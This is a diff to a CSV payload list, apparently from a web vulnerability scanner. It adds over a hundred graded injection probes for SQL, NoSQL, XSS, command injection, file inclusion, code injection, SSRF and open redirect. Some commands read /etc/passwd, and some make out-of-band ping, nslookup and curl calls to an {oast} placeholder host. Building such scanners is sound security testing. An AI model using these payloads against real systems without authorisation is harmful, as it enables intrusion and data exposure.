@@ -1,4 +1,119 @@
-Payload,Type
-"-eval(""window['pro'%2B'mpt'](8)"")-",XSS
-"r&1\""=1",SQL
-/.../.../.../.../.../,LFI
+Payload,Type,Level
+"-eval(""window['pro'%2B'mpt'](8)"")-",XSS,3
+"r&1\""=1",SQL,3
+/.../.../.../.../.../,LFI,3
+',SQL,1
+"""",SQL,1
+\,SQL,1
+'),SQL,1
+' OR '1'='1,SQL,2
+' OR 1=1-- -,SQL,2
+""" OR ""1""=""1",SQL,2
+1 OR 1=1,SQL,1
+' UNION SELECT NULL-- -,SQL,2
+"' AND extractvalue(1,concat(0x7e,0x667761))-- -",SQL,2
+"1 AND extractvalue(1,concat(0x7e,0x667761))",SQL,1
+' AND 1=CAST('fwa' AS int)--,SQL,2
+' OR '1'='1' -- -,SQL,2
+') OR ('1'='1' -- -,SQL,2
+1' OR '1'='1,SQL,2
+' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -,SQL_TIME_BASED,2
+' OR (SELECT 1 FROM (SELECT SLEEP(5))x)-- -,SQL_TIME_BASED,2
+""" AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -",SQL_TIME_BASED,2
+1 AND (SELECT 1 FROM (SELECT SLEEP(5))x),SQL_TIME_BASED,1
+'+(SELECT 1 FROM (SELECT SLEEP(5))x)+',SQL_TIME_BASED,2
+' AND 1=(SELECT 1 FROM pg_sleep(5))--,SQL_TIME_BASED,2
+';SELECT pg_sleep(5)--,SQL_TIME_BASED,2
+' AND (SELECT 1 FROM (SELECT SLEEP(5))x) AND '1'='1,SQL_TIME_BASED,2
+' AND 1=(SELECT 1 FROM pg_sleep(5)) AND '1'='1,SQL_TIME_BASED,2
+<script>alert(41837)</script>,XSS,1
+<img src=x onerror=alert(41837)>,XSS,1
+<svg onload=alert(41837)>,XSS,1
+"""><script>alert(41837)</script>",XSS,2
+'><script>alert(41837)</script>,XSS,2
+><script>alert(41837)</script>,XSS,2
+"""><img src=x onerror=alert(41837)>",XSS,2
+'><img src=x onerror=alert(41837)>,XSS,2
+</script><script>alert(41837)</script>,XSS,2
+<ScRiPt>alert(41837)</sCrIpT>,XSS,3
+<scr<script>ipt>alert(41837)</scr</script>ipt>,XSS,3
+<iframe src=javascript:alert(41837)>,XSS,1
+';alert(41837);//,XSS,2
+""";alert(41837);//",XSS,2
+'-alert(41837)-',XSS,2
+"""-alert(41837)-""",XSS,2
+-alert(41837)-,XSS,1
+alert(41837),XSS,1
+javascript:alert(41837),XSS,1
+""" autofocus onfocus=alert(41837) x=""",XSS,2
+' autofocus onfocus=alert(41837) x=',XSS,2
+</script><img src=x onerror=alert(41837)>,XSS,2
+<h1>fwa-htmli</h1>,HTMLI,1
+"""><h1>fwa-htmli</h1>",HTMLI,2
+'><h1>fwa-htmli</h1>,HTMLI,2
+><h1>fwa-htmli</h1>,HTMLI,2
+</textarea><h1>fwa-htmli</h1>,HTMLI,2
+--!><h1>fwa-htmli</h1>,HTMLI,2
+;echo $((1873*7177)),CMDI,1
+|echo $((1873*7177)),CMDI,1
+||echo $((1873*7177)),CMDI,1
+&echo $((1873*7177)),CMDI,1
+$(echo $((1873*7177))),CMDI,1
+`echo $((1873*7177))`,CMDI,1
+';echo $((1873*7177));',CMDI,2
+""";echo $((1873*7177));""",CMDI,2
+;cat /etc/passwd,CMDI,1
+|cat /etc/passwd,CMDI,1
+;sleep 5,CMDI_TIME_BASED,1
+|sleep 5,CMDI_TIME_BASED,1
+||sleep 5,CMDI_TIME_BASED,1
+$(sleep 5),CMDI_TIME_BASED,1
+`sleep 5`,CMDI_TIME_BASED,1
+';sleep 5;',CMDI_TIME_BASED,2
+""";sleep 5;""",CMDI_TIME_BASED,2
+& ping -c 5 127.0.0.1,CMDI_TIME_BASED,1
+'||sleep 5||',CMDI_TIME_BASED,2
+../../../../../../../../etc/passwd,LFI,1
+/etc/passwd,LFI,1
+....//....//....//....//....//....//etc/passwd,LFI,3
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,LFI,3
+../../../../../../../../etc/passwd%00.png,LFI,3
+../../../../../../../../,LFI,1
+../../../../../../../../etc/passwd%00,LFI,3
+print(1873*7177);,CODE_INJECTION,1
+1;print(1873*7177),CODE_INJECTION,2
+';print(1873*7177);//,CODE_INJECTION,2
+""";print(1873*7177);//",CODE_INJECTION,2
+${print(1873*7177)},CODE_INJECTION,2
+1873*7177,CODE_INJECTION,1
+<?php print(1873*7177);?>,CODE_INJECTION,2
+"{""$ne"":null}",NOSQL,1
+"{""$ne"":""""}",NOSQL,1
+"{""$gt"":""""}",NOSQL,1
+"{""$regex"":"".*""}",NOSQL,1
+' || '1'=='1,NOSQL,2
+'||1==1//,NOSQL,2
+"{""$where"":""1==1""}",NOSQL,1
+"{""$where"":""sleep(5000)||true""}",NOSQL_TIME_BASED,1
+';sleep(5000);',NOSQL_TIME_BASED,2
+1;sleep(5000),NOSQL_TIME_BASED,2
+file:///etc/passwd,SSRF,1
+http://localhost/,SSRF,1
+http://127.0.0.1/,SSRF,1
+http://127.1/,SSRF,3
+http://2130706433/,SSRF,3
+http://[::1]/,SSRF,3
+http://0.0.0.0/,SSRF,3
+http://localhost/admin/,SSRF,1
+https://fwa-redirect.example/,OPEN_REDIRECT,1
+//fwa-redirect.example/,OPEN_REDIRECT,3
+http://fwa-redirect.example/,OPEN_REDIRECT,1
+http://{oast}/,SSRF_OAST,1
+{oast},SSRF_OAST,1
+;ping -c 1 {oast},CMDI_OAST,1
+|ping -c 1 {oast},CMDI_OAST,1
+&&ping -c 1 {oast},CMDI_OAST,1
+$(ping -c 1 {oast}),CMDI_OAST,1
+`ping -c 1 {oast}`,CMDI_OAST,1
+;nslookup {oast},CMDI_OAST,1
+;curl http://{oast}/,CMDI_OAST,1
